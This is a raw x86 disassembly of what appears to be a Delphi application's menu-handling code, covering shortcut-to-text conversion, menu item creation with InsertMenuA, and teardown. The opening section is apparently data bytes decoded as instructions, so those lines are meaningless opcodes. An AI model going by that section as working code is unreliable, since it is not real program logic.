add [ esi + 0x45 ] ah
jo r-xdata
or eax 0x6f42616d
insd
popad
push esp
outsd
jo r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ esi + 0x45 ] al
outsb
jne r-xdata
inc eax
add [ edi + ebp * 4 - 0x73cfffbb ] bh
inc ecx
add ah ah
or eax [ edx ]
dec esp
mov eax [ ecx ]
mov [ ecx - 0x5ddbffbb ] ah
inc ebp
add ah cl
or al 0x42
add ah al
or eax 0xff40042
inc edx
add ah bl
or al 0x42
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
dec eax
scasd [ edi ]
inc ebp
add [ eax - 0x5f ] dh
inc ebp
add [ ecx + ebx * 4 - 0x5e5fffbb ] dh
inc ebp
add al dh
scasd [ edi ]
inc ebp
add [ eax + 0xa0045b0 ] ch
push esp
push eax
outsd
jo r-xdata
add [ edx + esi ] ah
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 2 + 0x45 ] al
add [ eax ] bh
add [ eax ] al
fcom [ ebp + eax * 2 ]
outsd
inc edx
outsd
je r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al dh
push edi
inc ebp
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
fmul [ edi ]
inc edx
add [ esp + esi + 0x9300040 ] ch
inc edx
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
push esp
pop ecx
inc ebp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x8004034 ] ch
outsd
insd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
lodsb [ esi ]
mov al [ 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
jns r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
outsd
pushfd
pop eax
inc ebp
je r-xdata
jne r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
jmp eax
jo r-xdata
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add ah dl
add [ ecx ] 0x78
test [ ecx ] eax
mov eax 0x28004187
test [ ecx ] al
movsb [ edi ] [ esi ]
test [ ecx ] al
shr [ ecx + 0x540a0045 ] 0x50
outsd
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xe865646f
push edi
inc ecx
add [ eax + esi * 4 ] al
inc ebp
sahf
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
push edi
inc ecx
add [ eax + esi * 4 ] cl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
call 0x4459b8b
mov al 0x45
add [ esi + 0x45 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
mov eax 0x6400454f
cmpsb [ esi ] [ edi ]
inc ebp
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
je r-xdata
push 0x4c6f5474
inc ebp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
pop eax
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 2 + 0x45 ] dl
add [ eax ] al
outsd
dec esp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x5c
jo r-xdata
inc ebx
push 0x65676e61
push esp
pop eax
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf065646f
push edi
inc ebp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
inc ebp
add [ eax ] cl
add bh bh
call 0x145a003
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add al bl
pop ebp
outsb
les ecx [ ebp + 0x45 ]
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
pop ecx
inc ebp
add [ eax + 0x10004555 ] dl
add [ 0x756e654d ] al
jae r-xdata
outsb
add eax 0x756e654d
jae r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
shl [ ebx + ebx * 2 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1400455b ] bh
add [ eax ] al
add [ eax ] dh
add [ eax ] al
dec esp
movsd [ edi ] [ esi ]
inc ebp
add ah al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
inc ebp
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
add [ eax - 0x77ffbd68 ] ch
cwde
inc edx
add [ eax + ebx * 4 + 0x42 ] dh
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
inc esp
cwde
inc edx
inc ebp
add [ eax ] cl
add [ eax ] al
add [ edi + edx * 4 ] al
inc edx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax + ebx * 4 + 0x42 ] al
imul esi [ ebx + 0x74 ] 0x455c1090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 2 ] bl
add [ esi + 0x45 ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
mov eax 0x4400454f
cmpsb [ esi ] [ edi ]
inc ebp
add [ eax + 0x60004557 ] dh
add [ eax ] al
jmp [ eax ]
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44a940
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_455c5c
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_444fdc
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44a940
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_455cb4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_455cec
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403fe8
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_404258
sub_455d40
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_455f29
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404080
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_4041d0
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404080
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404080
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_4041d0
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_4041d0
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403fe8
mov eax esi
call sub_403fe8
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404080
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_4080ac
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4042f4
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_455cec
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4042b0
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404080
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4042b0
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_4042b0
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4042b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455f30
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40400c
retn
sub_455f44
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_4042a8
push eax
mov eax edi
call sub_4042a8
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4042a8
push eax
mov eax edi
call sub_4044a8
push eax
mov eax [ esi ]
call sub_4044a8
pop edx
pop ecx
call sub_407f8c
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_4042a8
mov ecx eax
mov eax esi
mov edx 0x1
call sub_404548
sub_455fa0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404498
xor eax eax
push ebp
push sub_45607b
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_455f44
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_455f44
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_455f44
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_455f44
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456082
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_455d40
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407f3c
test eax eax
jne r-xdata
sub_4560b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_458658
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_458668
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_456118
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_458658
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_458658
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_458668
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_458668
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_4560b8
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_4560b8
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_458668
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_458668
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_456264
push ebx
mov ebx eax
mov eax ebx
call sub_452e0c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_45b378
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_45629c
push ebx
mov ebx eax
mov eax ebx
call sub_452e20
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4562cc
push ebx
mov ebx eax
mov eax ebx
call sub_452e34
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4562fc
push ebx
mov ebx eax
mov eax ebx
call sub_452e5c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45632c
push ebx
mov ebx eax
mov eax ebx
call sub_452e84
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_4043f4
je r-xdata
mov al 0x1
pop ebx
retn
sub_456360
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_452e48
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_45639c
push ebx
mov ebx eax
mov eax ebx
call sub_452e98
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4563d0
push ebx
mov ebx eax
mov eax ebx
call sub_452eac
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_456404
push ebx
mov ebx eax
mov eax ebx
call sub_452ec0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_456438
push ebx
mov ebx eax
mov eax ebx
call sub_42115c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_456460
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_456480
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4584c0
sub_4564a0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_458530
sub_4564c0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_458584
sub_4564e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_4564fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_40403c
sub_456520
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4586b0
sub_456540
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45868c
sub_456560
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4586a0
sub_456580
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_4565ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42086c
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_456098
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_458fbc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_456628
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45b15c
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_458658
test eax eax
jg r-xdata
mov edx esi
call sub_4589f0
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_458668
call sub_403270
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403270
lea eax [ esi + 0x44 ]
call sub_40cf90
lea eax [ esi + 0x78 ]
call sub_40cf90
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_456a44
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_418a7c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4208b8
test bl bl
jle r-xdata
call sub_403270
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_4566dc
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_456937
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45693e
lea eax [ ebp - 0x40 ]
call sub_403fe8
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_404080
mov eax ebx
call sub_458658
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_456bec
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4043f4
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_458658
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_458c14
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_455d40
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404368
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4044a8
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_4044a8
push eax
mov eax ebx
call sub_456bec
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
